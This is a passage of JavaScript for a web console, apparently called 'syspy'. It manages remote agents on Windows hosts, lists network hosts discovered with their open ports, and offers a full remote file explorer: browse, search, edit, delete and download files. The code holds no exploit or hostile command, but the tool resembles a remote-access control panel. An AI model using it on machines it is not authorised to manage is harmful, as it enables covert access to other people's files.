
      if ([...state.agents.values()].some(a => a.id === hostId)) return;

      state.agents.set(hostId, {

        id: hostId, __ghost: true, parent: id.replace(/^agent:/, ""), name: h.hostname || h.ip,

        display: h.hostname || h.ip, online: true, hop: 0, version: "?",

        stats: {}, info: { system: (h.kind || "unknown") + " " + (h.ports || []).join(","), address: h.ip },

      });

    });

    renderTree();

  } else if (kind === "fs_op_result") {

    if (payload.success) {

      toast(`Operation ${payload.op || ""} succeeded`);

      refreshFiles();

    } else {

      toast(`Operation failed: ${payload.error || "Error"}`);

      if (payload.op === "download" && state.fe.pendingDownloads) {

        for (const [k, v] of state.fe.pendingDownloads.entries()) {

          updateTransferItem(v.tid, `Failed: ${payload.error}`, 100, false, true);

        }

        state.fe.pendingDownloads.clear();

      }

    }

  }

}

/* ------------------------------------------------------------------ */

/* Navigation Controller                                              */

/* ------------------------------------------------------------------ */

function navigateTo(targetPath, addToHistory = true) {

  if (!state.selected) return;

  const norm = (!targetPath || targetPath === "This PC" || targetPath === "") ? "This PC" : targetPath.trim();

  

  if (addToHistory && norm !== state.fe.currentPath) {

    if (state.fe.historyIdx < state.fe.history.length - 1) {

      state.fe.history = state.fe.history.slice(0, state.fe.historyIdx + 1);

    }

    state.fe.history.push(norm);

    state.fe.historyIdx = state.fe.history.length - 1;

  }

  state.fe.currentPath = norm;

  state.fe.selectedPaths.clear();

  $("fe-search-results-view").classList.add("hidden");

  if (norm === "This PC") {

    state.fe.isThisPc = true;

    $("fe-thispc-view").classList.remove("hidden");

    $("fe-items-view").classList.add("hidden");

    renderBreadcrumbs();

    renderSidebar();

    renderThisPc();

    sendCommand("fs.drives");

  } else {

    state.fe.isThisPc = false;

    $("fe-thispc-view").classList.add("hidden");

    $("fe-items-view").classList.remove("hidden");

    renderBreadcrumbs();

    renderSidebar();

    renderItemsView();

    sendCommand(`fs.list "${norm}"`);

  }

  updateNavButtons();

}

function navBack() {

  if (state.fe.historyIdx > 0) {

    state.fe.historyIdx--;

    navigateTo(state.fe.history[state.fe.historyIdx], false);

  }

}

function navForward() {

  if (state.fe.historyIdx < state.fe.history.length - 1) {

    state.fe.historyIdx++;

    navigateTo(state.fe.history[state.fe.historyIdx], false);

  }

}

function navUp() {

  if (state.fe.isThisPc) return;

  const curr = state.fe.currentPath.replace(/[\\\/]+$/, "");

  // If drive root like C: or C:\, return to This PC

  if (/^[A-Za-z]:$/i.test(curr) || /^[A-Za-z]:\\$/i.test(curr)) {

    navigateTo("This PC");

    return;

  }

  const lastSlash = Math.max(curr.lastIndexOf("\\"), curr.lastIndexOf("/"));

  if (lastSlash > 0) {

    let parent = curr.substring(0, lastSlash);

    if (/^[A-Za-z]:$/i.test(parent)) parent += "\\";

    navigateTo(parent);

  } else {

    navigateTo("This PC");

  }

}

function updateNavButtons() {

  $("fe-btn-back").disabled = state.fe.historyIdx <= 0;

  $("fe-btn-forward").disabled = state.fe.historyIdx >= state.fe.history.length - 1;

  $("fe-btn-up").disabled = state.fe.isThisPc;

}

function refreshFiles() {

  if (!state.selected) return;

  renderBreadcrumbs();

  renderSidebar();

  if (state.fe.isThisPc || state.fe.currentPath === "This PC") {

    renderThisPc();

    sendCommand("fs.drives");

  } else {

    renderItemsView();

    sendCommand(`fs.list "${state.fe.currentPath}"`);

  }

}

/* ------------------------------------------------------------------ */

/* Breadcrumb Address Bar                                             */

/* ------------------------------------------------------------------ */

function renderBreadcrumbs() {

  const container = $("fe-breadcrumbs");

  container.innerHTML = "";

  const rawPath = state.fe.currentPath;

  if (state.fe.isThisPc || rawPath === "This PC") {

    const chip = document.createElement("span");

    chip.className = "fe-crumb active";

    chip.textContent = "💻 This PC";

    container.appendChild(chip);

    $("fe-path-input").value = "This PC";

    return;

  }

  $("fe-path-input").value = rawPath;

  // Root "This PC" crumb

  const pcChip = document.createElement("span");

  pcChip.className = "fe-crumb";

  pcChip.textContent = "💻 This PC";

  pcChip.onclick = (e) => { e.stopPropagation(); navigateTo("This PC"); };

  container.appendChild(pcChip);

  // Normalize slashes

  const parts = rawPath.replace(/\//g, "\\").split("\\").filter(Boolean);

  let accum = "";

  parts.forEach((part, index) => {

    const sep = document.createElement("span");

    sep.className = "fe-crumb-sep";

    sep.textContent = " > ";

    container.appendChild(sep);

    if (index === 0 && /^[A-Za-z]:$/.test(part)) {

      accum = part + "\\";

    } else {

      accum = accum ? (accum.endsWith("\\") ? accum + part : accum + "\\" + part) : part;

    }

    const currentTarget = accum;

    const isLast = index === parts.length - 1;

    const chip = document.createElement("span");

    chip.className = "fe-crumb" + (isLast ? " active" : "");

    chip.textContent = part;

    if (!isLast) {

      chip.onclick = (e) => { e.stopPropagation(); navigateTo(currentTarget); };

    }

    container.appendChild(chip);

  });

}

function enableAddressInput() {

  $("fe-breadcrumbs").classList.add("hidden");

  $("fe-path-input").classList.remove("hidden");

  $("fe-path-input").focus();

  $("fe-path-input").select();

}

function disableAddressInput() {

  $("fe-breadcrumbs").classList.remove("hidden");

  $("fe-path-input").classList.add("hidden");

}

/* ------------------------------------------------------------------ */

/* Sidebar Rendering                                                  */

/* ------------------------------------------------------------------ */

function renderSidebar() {

  // Quick Access Special Folders

  const specialsBox = $("fe-sidebar-specials");

  specialsBox.innerHTML = "";

  const specials = state.fe.specialFolders || {};

  const specialIcons = {

    Desktop: "🖥", Documents: "📁", Downloads: "⬇",

    Pictures: "🖼️", Music: "🎵", Videos: "🎬"

  };

  if (Object.keys(specials).length > 0) {

    Object.entries(specials).forEach(([key, fullPath]) => {

      const item = document.createElement("div");

      item.className = "fe-sidebar-item" + (state.fe.currentPath === fullPath ? " active" : "");

      item.dataset.path = fullPath;

      item.innerHTML = `<span class="fe-icon">${specialIcons[key] || "📁"}</span> <span class="fe-label">${escapeHtml(key)}</span>`;

      item.onclick = () => navigateTo(fullPath);

      specialsBox.appendChild(item);

    });

  } else {

    // Show standard quick access items

    ["Desktop", "Documents", "Downloads", "Pictures", "Music", "Videos"].forEach((key) => {

      const item = document.createElement("div");

      item.className = "fe-sidebar-item";

      item.innerHTML = `<span class="fe-icon">${specialIcons[key] || "📁"}</span> <span class="fe-label">${escapeHtml(key)}</span>`;

      item.onclick = () => {

        if (state.fe.specialFolders[key]) navigateTo(state.fe.specialFolders[key]);

      };

      specialsBox.appendChild(item);

    });

  }

  // Drives List

  const drivesBox = $("fe-sidebar-drives");

  drivesBox.innerHTML = "";

  (state.fe.drives || []).forEach((drv) => {

    const item = document.createElement("div");

    const driveRoot = drv.path || (drv.letter ? (drv.letter.endsWith("\\") ? drv.letter : drv.letter + "\\") : drv.name);

    const cleanLetter = (drv.letter || "").replace(/\\+$/, "");

    const displayName = drv.label ? `${drv.label} (${cleanLetter})` : (drv.name || cleanLetter);

    item.className = "fe-sidebar-item" + (state.fe.currentPath.startsWith(driveRoot) ? " active" : "");

    item.dataset.path = driveRoot;

    item.innerHTML = `<span class="fe-icon">${getDriveIcon(drv.drive_type)}</span> <span class="fe-label">${escapeHtml(displayName)}</span>`;

    item.onclick = () => navigateTo(driveRoot);

    drivesBox.appendChild(item);

  });

  // Bookmarks

  const bookmarksBox = $("fe-sidebar-bookmarks");

  bookmarksBox.innerHTML = "";

  (state.fe.bookmarks || []).forEach((bm, idx) => {

    const item = document.createElement("div");

    item.className = "fe-sidebar-item" + (state.fe.currentPath === bm.path ? " active" : "");

    item.innerHTML = `

      <span class="fe-icon">⭐</span>

      <span class="fe-label" title="${escapeHtml(bm.path)}">${escapeHtml(bm.name)}</span>

      <span class="fe-del-bm" title="Remove bookmark">✕</span>

    `;

    item.querySelector(".fe-label").onclick = () => navigateTo(bm.path);

    item.querySelector(".fe-icon").onclick = () => navigateTo(bm.path);

    item.querySelector(".fe-del-bm").onclick = (e) => {

      e.stopPropagation();

      state.fe.bookmarks.splice(idx, 1);

      localStorage.setItem("syspy_bookmarks", JSON.stringify(state.fe.bookmarks));

      renderSidebar();

    };

    bookmarksBox.appendChild(item);

  });

  // Recent Locations

  const recentsBox = $("fe-sidebar-recents");

  recentsBox.innerHTML = "";

  (state.fe.recents || []).slice(0, 6).forEach((rc) => {

    const item = document.createElement("div");

    item.className = "fe-sidebar-item";

    const shortName = rc.split(/[\/\\]/).filter(Boolean).pop() || rc;

    item.innerHTML = `<span class="fe-icon">🕒</span> <span class="fe-label" title="${escapeHtml(rc)}">${escapeHtml(shortName)}</span>`;

    item.onclick = () => navigateTo(rc);

    recentsBox.appendChild(item);

  });

  // Highlight This PC in sidebar

  $("fe-sb-thispc").classList.toggle("active", state.fe.isThisPc);

}

function addRecentLocation(path) {

  if (!path || path === "This PC") return;

  state.fe.recents = state.fe.recents.filter((p) => p !== path);

  state.fe.recents.unshift(path);

  if (state.fe.recents.length > 10) state.fe.recents.pop();

  localStorage.setItem("syspy_recents", JSON.stringify(state.fe.recents));

}

/* ------------------------------------------------------------------ */

/* "This PC" View Rendering                                           */

/* ------------------------------------------------------------------ */

function renderThisPc() {

  const grid = $("fe-drives-grid");

  grid.innerHTML = "";

  const drives = state.fe.drives || [];

  if (!drives.length) {

    grid.innerHTML = `<div class="muted" style="padding:16px;">Scanning host drives...</div>`;

    return;

  }

  drives.forEach((drv) => {

    const card = document.createElement("div");

    card.className = "fe-drive-card";

    const driveRoot = drv.path || (drv.letter ? (drv.letter.endsWith("\\") ? drv.letter : drv.letter + "\\") : drv.name);

    const cleanLetter = (drv.letter || "").replace(/\\+$/, "");

    const displayName = drv.label ? `${drv.label} (${cleanLetter})` : (drv.name || cleanLetter);

    const pct = Math.round(drv.percent_used || drv.percent || 0);

    const barClass = pct >= 90 ? "danger" : pct >= 75 ? "warn" : "";

    let capacityText = "Inaccessible";

    if (drv.total) {

      capacityText = `${humanSize(drv.free)} free of ${humanSize(drv.total)}`;

    } else if (drv.accessible === false) {

      capacityText = "Media not inserted or inaccessible";

    }

    card.innerHTML = `

      <div class="fe-drive-icon">${getDriveIcon(drv.drive_type || drv.type)}</div>

      <div class="fe-drive-details">

        <div class="fe-drive-name">${escapeHtml(displayName)}</div>

        <div class="fe-drive-bar-wrap">

          <div class="fe-drive-bar ${barClass}" style="width: ${pct}%"></div>

        </div>

        <div class="fe-drive-meta">${capacityText} ${drv.fs_type ? `(${escapeHtml(drv.fs_type)})` : ""}</div>

      </div>

    `;

    card.onclick = () => {

      document.querySelectorAll(".fe-drive-card").forEach((c) => c.classList.remove("selected"));

      card.classList.add("selected");

    };

    card.ondblclick = () => {

      navigateTo(driveRoot);

    };

    card.oncontextmenu = (e) => {

      e.preventDefault();

      openContextMenu(e.clientX, e.clientY, { name: cleanLetter, path: driveRoot, dir: true, isDrive: true });

    };

    grid.appendChild(card);

  });

  $("fe-status-selection").textContent = `${drives.length} drives detected`;

  $("fe-status-drive").textContent = "Connected Host: " + (state.agents.get(state.selected)?.display || "Host");

}

/* ------------------------------------------------------------------ */

/* Directory Listing View (Details & Tiles Mode)                      */

/* ------------------------------------------------------------------ */

function renderItemsView() {

  const body = $("fe-items-body");

  body.innerHTML = "";

  const items = (state.fe.items || []).slice();

  // Sorting

  const key = state.fe.sortBy;

  const asc = state.fe.sortAsc ? 1 : -1;

  items.sort((a, b) => {

    if (a.dir !== b.dir) return a.dir ? -1 : 1;

    let valA = a[key] ?? "";

    let valB = b[key] ?? "";

    if (typeof valA === "string") return valA.localeCompare(valB) * asc;

    return (valA - valB) * asc;

  });

  if (!items.length) {

    body.innerHTML = `<div class="muted" style="padding:24px;text-align:center;">This folder is empty.</div>`;

    updateSelectionStatus();

    return;

  }

  items.forEach((item) => {

    // Ensure item.path is always fully qualified

    if (!item.path) {

      item.path = state.fe.currentPath.endsWith("\\")

        ? state.fe.currentPath + item.name

        : state.fe.currentPath + "\\" + item.name;

    }

    const row = document.createElement("div");

    row.className = "fe-item-row" + (state.fe.selectedPaths.has(item.path) ? " selected" : "");

    if (state.fe.clipboard.op === "cut" && state.fe.clipboard.paths.includes(item.path)) {

      row.classList.add("cut");

    }

    row.dataset.path = item.path;

    const isDir = !!item.dir;

    const icon = getFileIcon(item.name, isDir);

    const sizeStr = isDir ? "" : humanSize(item.size);

    const modStr = item.modified ? new Date(item.modified * 1000).toLocaleString() : "";

    const typeStr = getFileTypeDescription(item.name, isDir);

    const attrStr = item.attributes ? item.attributes : "";

    row.innerHTML = `

      <div class="fe-col fe-col-check">

        <input type="checkbox" class="fe-item-checkbox" ${state.fe.selectedPaths.has(item.path) ? "checked" : ""}>

      </div>

      <div class="fe-col fe-col-name fe-item-name ${isDir ? "dir" : ""}">

        <span class="fe-item-icon">${icon}</span>

        <span class="fe-item-text" title="${escapeHtml(item.name)}">${escapeHtml(item.name)}</span>

      </div>

      <div class="fe-col fe-col-modified">${escapeHtml(modStr)}</div>

      <div class="fe-col fe-col-type">${escapeHtml(typeStr)}</div>

      <div class="fe-col fe-col-size">${escapeHtml(sizeStr)}</div>

      <div class="fe-col fe-col-attr">${escapeHtml(attrStr)}</div>

      <div class="fe-col fe-col-actions fe-row-actions">

        ${!isDir ? `<button class="fe-action-btn edit-btn" title="Open in Code Editor">EDIT</button>` : ""}

        <button class="fe-action-btn download-btn" title="Download">GET</button>

      </div>

    `;

    // Row click selection

    row.onclick = (e) => {

      if (e.target.classList.contains("edit-btn") || e.target.classList.contains("download-btn")) return;

      if (e.ctrlKey || e.metaKey) {

        if (state.fe.selectedPaths.has(item.path)) state.fe.selectedPaths.delete(item.path);

        else state.fe.selectedPaths.add(item.path);

      } else {

        state.fe.selectedPaths.clear();

        state.fe.selectedPaths.add(item.path);

      }

      renderItemSelection();

    };

    // Checkbox toggle

    const chk = row.querySelector(".fe-item-checkbox");

    chk.onclick = (e) => {

      e.stopPropagation();

      if (chk.checked) state.fe.selectedPaths.add(item.path);

      else state.fe.selectedPaths.delete(item.path);

      renderItemSelection();

    };

    // Double click open

    row.ondblclick = (e) => {

      e.stopPropagation();

      if (isDir) {

        navigateTo(item.path);

      } else {

        openFileInEditor(item.path);

      }

    };

    // Right-click context menu

    row.oncontextmenu = (e) => {

      e.preventDefault();

      if (!state.fe.selectedPaths.has(item.path)) {

        state.fe.selectedPaths.clear();

        state.fe.selectedPaths.add(item.path);

        renderItemSelection();

      }

      openContextMenu(e.clientX, e.clientY, item);

    };

    // Action buttons

    const editBtn = row.querySelector(".edit-btn");

    if (editBtn) {

      editBtn.onclick = (e) => { e.stopPropagation(); openFileInEditor(item.path); };

    }

    const dlBtn = row.querySelector(".download-btn");

    if (dlBtn) {

      dlBtn.onclick = (e) => { e.stopPropagation(); downloadPath(item.path); };

    }

    body.appendChild(row);

  });

  // Empty space right click

  body.oncontextmenu = (e) => {

    if (e.target === body) {

      e.preventDefault();

      openContextMenu(e.clientX, e.clientY, null);

    }

  };

  updateSelectionStatus();

}

function renderItemSelection() {

  const rows = document.querySelectorAll(".fe-item-row");

  rows.forEach((row) => {

    const p = row.dataset.path;

    const isSelected = state.fe.selectedPaths.has(p);

    row.classList.toggle("selected", isSelected);

    const chk = row.querySelector(".fe-item-checkbox");

    if (chk) chk.checked = isSelected;

  });

  updateSelectionStatus();

}

function updateSelectionStatus() {

  const total = (state.fe.items || []).length;

  const selCount = state.fe.selectedPaths.size;

  let text = `${total} item${total === 1 ? "" : "s"}`;

  if (selCount > 0) {

    let selBytes = 0;

    state.fe.items.forEach((it) => {

      if (state.fe.selectedPaths.has(it.path) && !it.dir) selBytes += (it.size || 0);

    });

    text += ` | ${selCount} item${selCount === 1 ? "" : "s"} selected ${selBytes ? `(${humanSize(selBytes)})` : ""}`;

  }

  $("fe-status-selection").textContent = text;

  if (state.fe.activeDriveInfo && state.fe.activeDriveInfo.total) {

    const free = state.fe.activeDriveInfo.free;

    const total = state.fe.activeDriveInfo.total;

    $("fe-status-drive").textContent = `${humanSize(free)} free of ${humanSize(total)}`;

  } else {

    $("fe-status-drive").textContent = "Remote PC File Explorer";

  }

}

/* ------------------------------------------------------------------ */

/* Search System                                                      */

/* ------------------------------------------------------------------ */

function triggerSearch(query) {

  if (!query || !query.trim()) {

    $("fe-search-results-view").classList.add("hidden");

    if (state.fe.isThisPc) $("fe-thispc-view").classList.remove("hidden");

    else $("fe-items-view").classList.remove("hidden");

    return;

  }

  const root = state.fe.isThisPc ? "C:\\" : state.fe.currentPath;

  $("fe-thispc-view").classList.add("hidden");

  $("fe-items-view").classList.add("hidden");

  $("fe-search-results-view").classList.remove("hidden");

  $("fe-search-summary").textContent = `Searching "${escapeHtml(query)}" in ${escapeHtml(root)}...`;

  $("fe-search-items-body").innerHTML = `<div class="muted" style="padding:20px;">Scanning remote Windows filesystem...</div>`;

  $("fe-btn-search-clear").classList.remove("hidden");

  sendCommand(`fs.search ${JSON.stringify({ root, query: query.trim() })}`);

}

function renderSearchResults(payload) {

  const body = $("fe-search-items-body");

  body.innerHTML = "";

  const results = payload.results || [];

  const count = results.length;

  const isTrunc = payload.truncated;

  $("fe-search-summary").textContent = `Found ${count} match${count === 1 ? "" : "es"}${isTrunc ? " (showing top 250)" : ""}`;

  if (!count) {

    body.innerHTML = `<div class="muted" style="padding:24px;text-align:center;">No matching files or folders found.</div>`;

    return;

  }

  results.forEach((item) => {

    const row = document.createElement("div");

    row.className = "fe-item-row";

    const isDir = !!item.dir;

    row.innerHTML = `

      <div class="fe-col fe-col-name fe-item-name ${isDir ? "dir" : ""}">

        <span class="fe-item-icon">${getFileIcon(item.name, isDir)}</span>

        <span class="fe-item-text">${escapeHtml(item.name)}</span>

      </div>

      <div class="fe-col" style="flex:2;color:var(--muted);font-size:11px;overflow:hidden;text-overflow:ellipsis;">${escapeHtml(item.path)}</div>

      <div class="fe-col fe-col-size">${isDir ? "" : humanSize(item.size)}</div>

      <div class="fe-col fe-col-actions fe-row-actions">

        ${!isDir ? `<button class="fe-action-btn edit-btn">EDIT</button>` : ""}

        <button class="fe-action-btn open-btn">GO TO</button>

      </div>

    `;

    row.ondblclick = () => {

      if (isDir) navigateTo(item.path);

      else openFileInEditor(item.path);

    };

    const editBtn = row.querySelector(".edit-btn");

    if (editBtn) editBtn.onclick = () => openFileInEditor(item.path);

    row.querySelector(".open-btn").onclick = () => {

      if (isDir) navigateTo(item.path);

      else {

        const parent = item.path.substring(0, item.path.lastIndexOf("\\"));

        navigateTo(parent);

      }

    };

    body.appendChild(row);

  });

}

/* ------------------------------------------------------------------ */

/* Remote Monaco Editor Integration                                   */

/* ------------------------------------------------------------------ */

function openFileInEditor(path) {

  if (!state.selected) return;

  state.fe.editor.path = path;

  state.fe.editor.isModified = false;

  $("fe-editor-title").textContent = path.split(/[\/\\]/).pop();

  $("fe-editor-path").textContent = path;

  $("fe-editor-dirty").classList.add("hidden");

  $("fe-editor-modal").classList.remove("hidden");

  $("fe-editor-status").textContent = "Loading file from host...";

  sendCommand(`fs.read "${path}"`);

}

function openEditorWithContent(data) {

  state.fe.editor.sha = data.sha;

  state.fe.editor.encoding = data.encoding || "UTF-8";

  state.fe.editor.lineEnding = data.line_ending || "CRLF";

  state.fe.editor.isModified = false;

  $("fe-editor-encoding").textContent = state.fe.editor.encoding;

  $("fe-editor-crlf").textContent = state.fe.editor.lineEnding;

  $("fe-editor-size").textContent = humanSize(data.size || 0);

  $("fe-editor-dirty").classList.add("hidden");

  $("fe-editor-status").textContent = data.read_only ? "Read-Only" : "Ready";

  const lang = getMonacoLanguage(state.fe.editor.path || "");

  $("fe-editor-lang").textContent = lang.toUpperCase();

  const container = $("fe-monaco-container");

  const fallback = $("fe-editor-fallback");

  if (window.monaco && monacoLoaded) {

    fallback.classList.add("hidden");

    if (!monacoEditorInstance) {

      monacoEditorInstance = window.monaco.editor.create(container, {

        value: data.content || "",

        language: lang,

        theme: "vs-dark",

        fontFamily: "'Cascadia Code', 'JetBrains Mono', Consolas, monospace",

        fontSize: 13,

        lineNumbers: "on",

        automaticLayout: true,

        minimap: { enabled: true },

        scrollBeyondLastLine: false,

        renderWhitespace: "selection",

      });

      monacoEditorInstance.onDidChangeModelContent(() => {

        if (!state.fe.editor.isModified) {

          state.fe.editor.isModified = true;

          $("fe-editor-dirty").classList.remove("hidden");

          $("fe-editor-status").textContent = "Modified";

        }

      });

      monacoEditorInstance.onDidChangeCursorPosition((e) => {

        $("fe-editor-cursor-pos").textContent = `Ln ${e.position.lineNumber}, Col ${e.position.column}`;

      });

      // Bind Ctrl+S shortcut inside Monaco

      monacoEditorInstance.addCommand(window.monaco.KeyMod.CtrlCmd | window.monaco.KeyCode.KeyS, () => {

        saveEditorContent();

      });

    } else {

      const model = monacoEditorInstance.getModel();

      if (model) {

        window.monaco.editor.setModelLanguage(model, lang);

        model.setValue(data.content || "");

      } else {

        monacoEditorInstance.setValue(data.content || "");

      }

    }

    monacoEditorInstance.focus();

  } else {

    // Fallback standard textarea

    fallback.classList.remove("hidden");

    fallback.value = data.content || "";

    fallback.oninput = () => {

      if (!state.fe.editor.isModified) {

        state.fe.editor.isModified = true;

        $("fe-editor-dirty").classList.remove("hidden");

      }

    };

  }

}

function getEditorText() {

  if (monacoEditorInstance && window.monaco && monacoLoaded) {

    return monacoEditorInstance.getValue();

  }

  return $("fe-editor-fallback").value;

}

function saveEditorContent(forceOverwrite = false) {

  if (!state.fe.editor.path || !state.selected) return;

  const content = getEditorText();

  $("fe-editor-status").textContent = "Saving to host...";

  const payload = {

    path: state.fe.editor.path,

    content: content,

    expected_sha: forceOverwrite ? "" : (state.fe.editor.sha || ""),

    encoding: state.fe.editor.encoding,

    line_ending: state.fe.editor.lineEnding,

  };

  sendCommand(`fs.save ${JSON.stringify(payload)}`);

}

function closeEditor() {

  if (state.fe.editor.isModified) {

    if (!confirm("You have unsaved changes. Discard changes and close?")) return;

  }

  $("fe-editor-modal").classList.add("hidden");

  state.fe.editor.path = null;

  state.fe.editor.isModified = false;

}

$("fe-editor-save-btn").onclick = () => saveEditorContent();

$("fe-editor-reload-btn").onclick = () => {

  if (state.fe.editor.isModified && !confirm("Discard unsaved changes and reload from PC?")) return;

  if (state.fe.editor.path) sendCommand(`fs.read "${state.fe.editor.path}"`);

};

$("fe-editor-fullscreen-btn").onclick = () => {

  const win = document.querySelector(".fe-editor-window");

  win.classList.toggle("fullscreen");

  if (monacoEditorInstance) monacoEditorInstance.layout();

};

$("fe-editor-close-btn").onclick = () => closeEditor();

/* ------------------------------------------------------------------ */

/* File Properties Modal                                              */

/* ------------------------------------------------------------------ */

function renderPropertiesModal(props) {

  const body = $("fe-prop-body");

  body.innerHTML = "";

  $("fe-prop-title").textContent = `Properties: ${props.name}`;

  const rows = [

    ["Name", props.name],

    ["Type", getFileTypeDescription(props.name, props.is_dir)],

    ["Location", props.path],

    ["Size", props.is_dir ? "—" : `${humanSize(props.size)} (${props.size?.toLocaleString()} bytes)`],

    ["Created", props.created ? new Date(props.created * 1000).toLocaleString() : "—"],

    ["Modified", props.modified ? new Date(props.modified * 1000).toLocaleString() : "—"],

    ["Accessed", props.accessed ? new Date(props.accessed * 1000).toLocaleString() : "—"],

    ["Attributes", props.attributes || "Normal"],

    ["SHA-256", props.sha256 ? props.sha256 : "—"],

  ];

  rows.forEach(([label, val]) => {

    const row = document.createElement("div");

    row.className = "fe-prop-row";

    row.innerHTML = `<span class="fe-prop-label">${escapeHtml(label)}:</span><span class="fe-prop-val">${escapeHtml(String(val))}</span>`;

    body.appendChild(row);

  });

  $("fe-properties-modal").classList.remove("hidden");

}

$("fe-prop-close").onclick = () => $("fe-properties-modal").classList.add("hidden");

$("fe-prop-ok").onclick = () => $("fe-properties-modal").classList.add("hidden");

/* ------------------------------------------------------------------ */

/* Transfer Drawer & Download Automation                              */

/* ------------------------------------------------------------------ */

function getTransferDrawer() {

  return $("fe-transfer-drawer");

}

function addTransferItem(id, title, type) {

  const drawer = getTransferDrawer();

  if (drawer) drawer.classList.remove("hidden");

  const list = $("fe-transfer-list");

  if (!list) return null;

  let item = list.querySelector(`[data-id="${id}"]`);

  if (!item) {

    item = document.createElement("div");

    item.className = "fe-transfer-item";

    item.dataset.id = id;

    list.prepend(item);

  }

  item.innerHTML = `

    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">

      <span style="font-weight:600; color:var(--accent); font-size:11px;">[${escapeHtml(type)}]</span>

      <span class="fe-transfer-status" style="color:var(--text-dim); font-size:10px; text-overflow:ellipsis; overflow:hidden; white-space:nowrap; max-width:180px;" title="${escapeHtml(title)}">${escapeHtml(title)}</span>

    </div>

    <div class="fe-transfer-bar" style="width: 25%; transition: width 0.3s ease, background 0.3s ease;"></div>

  `;

  return item;

}

function updateTransferItem(id, statusText, progressPercent, isDone, isError) {

  const list = $("fe-transfer-list");

  if (!list) return;

  const item = list.querySelector(`[data-id="${id}"]`);

  if (!item) return;

  const statusEl = item.querySelector(".fe-transfer-status");

  if (statusEl) statusEl.textContent = statusText;

  const bar = item.querySelector(".fe-transfer-bar");

  if (bar) {

    bar.style.width = Math.min(100, Math.max(0, progressPercent)) + "%";

    if (isError) {

      bar.style.background = "var(--err)";

    } else if (isDone) {

      bar.style.background = "var(--ok)";

    }

  }

}

if ($("fe-transfer-close")) {

  $("fe-transfer-close").onclick = () => {

    const drawer = getTransferDrawer();

    if (drawer) drawer.classList.add("hidden");

  };

}

function triggerBrowserDownload(url, filename) {

  const a = document.createElement("a");

  a.href = url;

  a.download = filename || "download";

  document.body.appendChild(a);

  a.click();

  a.remove();

}

function joinRemotePath(parent, child) {

  if (!parent || parent === "This PC") return child;

  const p = parent.replace(/[\/\\]+$/, "");

  return p + "\\" + child;

}

/* ------------------------------------------------------------------ */

/* Context Menu & Actions                                             */

/* ------------------------------------------------------------------ */

function openContextMenu(x, y, targetItem) {

  state.fe.contextTarget = targetItem;

  const menu = $("fe-context-menu");

  menu.classList.remove("hidden");

  // Adjust positioning to avoid overflow

  const menuWidth = 190;

  const menuHeight = 320;

  const posX = (x + menuWidth > window.innerWidth) ? x - menuWidth : x;

  const posY = (y + menuHeight > window.innerHeight) ? y - menuHeight : y;

  menu.style.left = posX + "px";

  menu.style.top = posY + "px";

  // Toggle options based on target

  const hasTarget = !!targetItem;

  const isDir = hasTarget && !!targetItem.dir;

  const hasClipboard = state.fe.clipboard.paths && state.fe.clipboard.paths.length > 0;

  menu.querySelector('[data-action="open"]').classList.toggle("disabled", !hasTarget);

  menu.querySelector('[data-action="edit"]').classList.toggle("disabled", !hasTarget || isDir);

  menu.querySelector('[data-action="download"]').classList.toggle("disabled", !hasTarget);

  menu.querySelector('[data-action="cut"]').classList.toggle("disabled", !hasTarget);

  menu.querySelector('[data-action="copy"]').classList.toggle("disabled", !hasTarget);

  menu.querySelector('[data-action="paste"]').classList.toggle("disabled", !hasClipboard || state.fe.isThisPc);

  const newFolderBtn = menu.querySelector('[data-action="new-folder"]');

  if (newFolderBtn) newFolderBtn.classList.toggle("disabled", state.fe.isThisPc);

  const newFileBtn = menu.querySelector('[data-action="new-file"]');

  if (newFileBtn) newFileBtn.classList.toggle("disabled", state.fe.isThisPc);

  const refreshBtn = menu.querySelector('[data-action="refresh"]');

  if (refreshBtn) refreshBtn.classList.toggle("disabled", false);

  menu.querySelector('[data-action="rename"]').classList.toggle("disabled", !hasTarget || targetItem.isDrive);

  menu.querySelector('[data-action="delete"]').classList.toggle("disabled", !hasTarget || targetItem.isDrive);

  menu.querySelector('[data-action="delete-perm"]').classList.toggle("disabled", !hasTarget || targetItem.isDrive);

  menu.querySelector('[data-action="properties"]').classList.toggle("disabled", !hasTarget);

}

function hideContextMenu() {

  $("fe-context-menu").classList.add("hidden");

}

document.addEventListener("click", () => hideContextMenu());

$("fe-context-menu").addEventListener("click", (e) => {

  const item = e.target.closest(".fe-menu-item");

  if (!item || item.classList.contains("disabled")) return;

  const action = item.dataset.action;

  const target = state.fe.contextTarget;

  if (action === "open") {

    if (target.dir) navigateTo(target.path);

    else openFileInEditor(target.path);

  } else if (action === "edit") {

    openFileInEditor(target.path);

  } else if (action === "download") {

    downloadPath(target.path);

  } else if (action === "copy") {

    state.fe.clipboard = { op: "copy", paths: [target.path] };

    toast("Copied to clipboard");

  } else if (action === "cut") {

    state.fe.clipboard = { op: "cut", paths: [target.path] };

    toast("Cut to clipboard");

    renderItemsView();

  } else if (action === "paste") {

    handlePaste();

  } else if (action === "new-folder") {

    $("fe-btn-new-folder").click();

  } else if (action === "new-file") {

    $("fe-btn-new-file").click();

  } else if (action === "refresh") {

    refreshFiles();

  } else if (action === "rename") {

    handleRename(target);

  } else if (action === "delete") {

    handleDelete(target.path, false);

  } else if (action === "delete-perm") {

    handleDelete(target.path, true);

  } else if (action === "properties") {

    sendCommand(`fs.prop "${target.path}"`);

  }

  hideContextMenu();

});

/* ------------------------------------------------------------------ */

/* File Operations: Create, Rename, Delete, Cut/Copy/Paste, Download   */

/* ------------------------------------------------------------------ */

function handleRename(target) {

  const oldPath = target.path;

  const currentName = target.name;

  const newName = prompt(`Rename "${currentName}" to:`, currentName);

  if (!newName || newName === currentName) return;

  sendCommand(`fs.rename ${JSON.stringify({ old_path: oldPath, new_name: newName.trim() })}`);

}

function handleDelete(path, permanent = false) {

  const name = path.split(/[\/\\]/).pop();

  const warning = permanent

    ? `PERMANENTLY DELETE "${name}"?\nThis cannot be undone.`

    : `Send "${name}" to Windows Recycle Bin?`;

  if (!confirm(warning)) return;

  sendCommand(`fs.delete ${JSON.stringify({ path, permanent })}`);

}

function handlePaste() {

  if (!state.fe.clipboard.paths || !state.fe.clipboard.paths.length || state.fe.isThisPc) return;

  const dest = state.fe.currentPath;

  const isMove = state.fe.clipboard.op === "cut";

  sendCommand(`fs.cpmv ${JSON.stringify({

    sources: state.fe.clipboard.paths,

    destination_dir: dest,

    is_move: isMove,

    conflict_resolution: "replace"

  })}`);

  if (isMove) state.fe.clipboard = { op: null, paths: [] };

}

function downloadPath(path) {

